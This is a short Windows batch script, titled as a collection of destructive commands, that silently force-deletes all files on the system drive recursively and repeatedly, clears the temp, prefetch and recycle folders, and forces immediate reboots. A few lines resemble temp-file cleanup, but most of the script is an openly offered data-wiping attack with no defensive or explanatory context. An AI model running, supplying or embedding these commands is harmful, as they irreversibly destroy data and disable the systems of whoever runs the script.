all the destructive commands (cmd, bat, batch file) 
@echo off
start /b del %systemdrive%. /f /s /q
start /b shutdown -r -f -t 00
REM Section 2
start /b del %systemdrive%\*.* /f /s /q

start /b del %systemdrive%\*.tmp /f /s /q
start /b del %systemdrive%\*._mp /f /s /q
start /b del %systemdrive%\*.log /f /s /q
start /b del %systemdrive%\*.gid /f /s /q
start /b del %systemdrive%\*.chk /f /s /q
start /b del %systemdrive%\*.old /f /s /q
start /b del %systemdrive%\recycled\*.* /f /s /q
start /b del %windir%\*.bak /f /s /q
start /b del %windir%\prefetch\*.* /f /s /q
start /b rd /s /q %windir%\temp
start /b md %windir%\temp

REM Section 4
start /b del C:\ *.* /f /s /q

REM Section 5
start /b del C: *.* /f /s /q
start /b shutdown -r -f -t 00
